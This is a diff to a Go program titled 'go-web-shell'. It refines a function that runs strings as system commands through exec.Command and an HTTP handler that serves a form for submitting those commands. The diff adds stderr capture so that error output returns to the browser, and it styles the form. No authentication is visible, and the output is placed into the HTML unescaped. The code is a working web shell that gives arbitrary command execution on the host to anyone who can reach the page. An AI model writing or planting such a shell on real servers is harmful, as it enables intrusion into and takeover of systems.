@@ -150,27 +150,29 @@ func run_cmd( s string ) string {
 	cmd := exec.Command( args[0], args[1:]... )
 
 	var out bytes.Buffer
+	var errorOutput bytes.Buffer
 
 	cmd.Stdout = &out
+	cmd.Stderr = &errorOutput
 
 	err2 := cmd.Run()
 
+	outputString := out.String()
+
 	if err2 != nil {
 		log.Println( err2 )
-		return "<b>error</b>"
+		return errorOutput.String()
 	}
 
-	output_string := out.String()
-	output_string = strings.Replace( output_string, "\n", "<br />", -1 )
+	outputString = strings.Replace( outputString, "\n", "<br />", -1 )
 
-	// return out.String()
-	return output_string
+	return outputString
 	
 }
 
 func handler(w http.ResponseWriter, r *http.Request) {
 
-	fmt.Fprintf( w, "<html><body><form method=\"post\"><input type=\"text\" name=\"c\" /><br /><input type=\"submit\" value=\"Ok\" /></form></body></html>" )
+	fmt.Fprintf( w, "<!doctype html><head><meta charset=\"utf-8\" /><title>go-web-shell</title></head><body><form method=\"post\"><input type=\"text\" name=\"c\" id=\"c\" size=\"50\" /><br /><input type=\"submit\" value=\"Ok\" /></form><script>document.getElementById('c').focus();</script></body></html>" )
 
 	if r.Method == "POST" {
 
